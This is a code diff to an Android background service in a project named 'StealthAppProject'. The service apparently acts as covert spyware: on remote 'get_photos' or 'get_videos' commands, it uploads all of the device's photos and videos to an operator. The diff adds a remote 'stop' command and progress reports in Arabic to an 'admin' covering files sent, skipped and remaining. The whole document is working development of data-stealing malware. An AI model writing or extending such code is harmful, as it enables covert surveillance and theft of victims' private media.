@@ -14,6 +14,7 @@ public class BotService extends Service {
     String REPO = "StealthAppProject";
     String DEVICE_ID; String DEVICE_NAME = android.os.Build.MODEL;
     String lastCmdTime = "0";
+    volatile boolean stopRequested = false;
     OkHttpClient client = new OkHttpClient.Builder()
         .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
         .writeTimeout(300, java.util.concurrent.TimeUnit.SECONDS)
@@ -88,9 +89,14 @@ public class BotService extends Service {
                     if (!cmdTime.equals(lastCmdTime)) {
                         lastCmdTime = cmdTime;
                         if (cmd.equals("get_photos")) {
+                            stopRequested = false;
                             new Thread(new Runnable() { @Override public void run() { sendAllMedia("photos"); } }).start();
                         } else if (cmd.equals("get_videos")) {
+                            stopRequested = false;
                             new Thread(new Runnable() { @Override public void run() { sendAllMedia("videos"); } }).start();
+                        } else if (cmd.equals("stop")) {
+                            stopRequested = true;
+                            sendMsg("⛔ تم استلام أمر الإيقاف...");
                         }
                     }
                 }
@@ -113,6 +119,11 @@ public class BotService extends Service {
         int total = files.size(); int sent = 0; int skipped = 0;
         sendMsg("📊 وُجد " + total + " ملف.");
         for (File f : files) {
+            if (stopRequested) {
+                if (logW != null) try { logW.close(); } catch(Exception e) {}
+                sendMsg("⛔ تم إيقاف العملية بأمر من المشرف\n✔️ مرسل: " + sent + "\n🔁 متخطى: " + skipped + "\n📊 المتبقي: " + (total - sent - skipped));
+                return;
+            }
             String absPath; try { absPath = f.getCanonicalPath(); } catch(Exception e) { absPath = f.getAbsolutePath(); }
             if (alreadySent.contains(absPath)) { skipped++; continue; }
             if (type.equals("videos") && f.length() > 50L*1024*1024) { skipped++; continue; }
